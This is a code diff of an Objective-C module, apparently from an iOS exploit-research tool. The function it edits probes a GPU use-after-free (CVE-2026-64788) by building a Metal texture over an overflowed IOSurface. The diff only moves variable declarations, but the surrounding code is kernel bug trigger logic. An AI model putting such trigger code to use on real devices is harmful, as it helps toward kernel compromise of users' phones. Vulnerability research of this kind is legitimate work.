@@ -33,6 +33,7 @@
 #import <time.h>
 #import <errno.h>
 #import <string.h>
+#import <objc/runtime.h>
 
 #import "Modules.h"
 #import "AppDelegate.h"
@@ -76,6 +77,9 @@ extern size_t IOSurfaceGetAllocSize(IOSurfaceRef_ buffer);
 // 1. CVE-2026-64788 oracle
 // ===========================================================================
 NSString *ModIOGPUUAFOracle(void) {
+    id dev = nil;      // declared at function scope (mid-block decls trip the CI parser)
+    id tex = nil;
+    id td = nil;
     AveLog(@"[gpu64788] === CVE-2026-64788 oracle: overflow IOSurface -> stale GPU resource entry ===");
 
     // ---- (1) find an accelerator / GPU user client ----
@@ -124,15 +128,15 @@ NSString *ModIOGPUUAFOracle(void) {
             // The trigger: a Metal texture over the overflow surface is how the
             // public PoC reaches IOGPUDevice::create_resource_iosurface.
             @try {
-                id dev = MTLCreateSystemDefaultDevice();
+                dev = MTLCreateSystemDefaultDevice();
                 if (dev) {
                     Class tdCls = objc_getClass("MTLTextureDescriptor");
-                    id td = [tdCls texture2DDescriptorWithPixelFormat:RS_MTL_PIXEL_BGRA8UNORM
-                                                               width:O[i].w height:O[i].h mipmapped:NO];
+                    td = [tdCls texture2DDescriptorWithPixelFormat:RS_MTL_PIXEL_BGRA8UNORM
+                                                             width:O[i].w height:O[i].h mipmapped:NO];
                     [td setUsage:RS_MTL_USAGE_SHADERREAD];
-                    id tex = [dev newTextureWithDescriptor:td
-                                                 iosurface:(struct __IOSurface *)s
-                                                     plane:0];
+                    tex = [dev newTextureWithDescriptor:td
+                                              iosurface:(struct __IOSurface *)s
+                                                  plane:0];
                     AveLog(S(@"    texture %-24s -> %s", O[i].tag, tex ? "created" : "nil"));
                 } else {
                     AveLog(S(@"    texture %-24s -> no MTLDevice", O[i].tag));
